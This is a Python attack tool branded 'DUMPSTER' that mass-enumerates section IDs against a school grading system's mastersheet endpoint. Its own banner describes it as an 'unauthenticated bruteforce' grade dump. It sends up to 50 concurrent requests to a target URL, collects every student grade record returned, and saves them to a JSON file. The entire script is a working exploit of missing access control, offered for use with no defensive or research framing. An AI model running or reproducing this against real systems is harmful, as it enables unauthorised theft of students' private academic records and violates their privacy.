import asyncio
import aiohttp
import json
import sys
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def _build_banner():
    art = [
        "        ) ) )        ",
        "       ( ( ( )       ",
        "      ) ) ) )(       ",
        "     ( ( ( ( ))      ",
        "    ) ) ) ( ( (      ",
        "   ( ( ) ) ) ) )     ",
        "    .----------.     ",
        "    |  ~~~~~   |     ",
        "    |  grade   |     ",
        "    |  d.u.m.p |     ",
        "    |  ~~~~~   |     ",
        "    '----------'     ",
        "      ||  ||  ||     ",
        "      ||  ||  ||     ",
        "     /||__||__||\\    ",
        "    /_____________\\  ",
    ]

    dumpster = [
        "██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗████████╗███████╗██████╗ ",
        "██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗",
        "██║  ██║██║   ██║██╔████╔██║██████╔╝███████╗   ██║   █████╗  ██████╔╝",
        "██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ╚════██║   ██║   ██╔══╝  ██╔══██╗",
        "██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████║   ██║   ███████╗██║  ██║",
        "╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝",
    ]

    T = max(len(l) for l in dumpster)
    colored_title = (
        [" " * T] * 5
        + [f"{CYAN}{l}{RESET}{' ' * (T - len(l))}" for l in dumpster]
        + [" " * T] * 5
    )

    lines = [""]
    for t, a in zip(colored_title, art):
        lines.append(f"  {t}    {YELLOW}{a}{RESET}")
    lines.append(f"\n  {DIM}mastersheet grade dump  //  unauthenticated bruteforce{RESET}\n")
    return "\n".join(lines)

print(_build_banner())

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL  = input(f"  {CYAN}[?]{RESET} Target URL               : ").strip().rstrip("/")
    SY_ID     = input(f"  {CYAN}[?]{RESET} SY ID         (def 1)   : ").strip() or "1"
    LEVEL_ID  = input(f"  {CYAN}[?]{RESET} Level ID      (def 3)   : ").strip() or "3"
    QUARTER   = input(f"  {CYAN}[?]{RESET} Quarter       (def 1)   : ").strip() or "1"
    _rng      = input(f"  {CYAN}[?]{RESET} Section range (1-500)   : ").strip() or "1-500"
    MAX_CONC  = int(input(f"  {CYAN}[?]{RESET} Concurrency  (def 50)  : ").strip() or "50")
    OUT_FILE  = input(f"  {CYAN}[?]{RESET} Output file  (dump.json): ").strip() or "dump.json"
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

_s, _e = (_rng.split("-") + [_rng])[:2] if "-" in _rng else (_rng, _rng)
sections = list(range(int(_s), int(_e) + 1))
results  = []

# ── async core ────────────────────────────────────────────────────────────────

async def fetch(session, semaphore, lock, section_id):
    async with semaphore:
        try:
            params = {
                "syid":      SY_ID,
                "sectionid": section_id,
                "levelid":   LEVEL_ID,
                "quarter":   QUARTER,
            }
            async with session.get(
                f"{BASE_URL}/grades/report/mastersheet", params=params
            ) as r:
                data = await r.json(content_type=None)
                if data:
                    async with lock:
                        results.append({"section_id": section_id, "students": data})
                    tqdm.write(
                        f"  {GREEN}[+]{RESET} Section {CYAN}{section_id:>4}{RESET}"
                        f" → {len(data)} student(s)"
                    )
        except Exception:
            pass

async def main():
    semaphore = asyncio.Semaphore(MAX_CONC)
    lock      = asyncio.Lock()

    print()
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=MAX_CONC)
    ) as session:
        with tqdm(
            total=len(sections),
            desc=f"  {DIM}scanning{RESET}",
            unit="sec",
            colour="cyan",
            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]",
            leave=True,
        ) as pbar:
            async def run(sid):
                await fetch(session, semaphore, lock, sid)
                pbar.update(1)
                pbar.set_postfix(found=len(results))

            await asyncio.gather(
                *[asyncio.create_task(run(sid)) for sid in sections],
                return_exceptions=True,
            )

    _save()

def _save():
    print()
    if results:
        with open(OUT_FILE, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print(f"  {GREEN}[✓]{RESET} {len(results)} section(s) with data saved → {CYAN}{OUT_FILE}{RESET}")
    else:
        print(f"  {YELLOW}[!]{RESET} No grade data found.")
    print()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Interrupted — saving partial results...")
    _save()
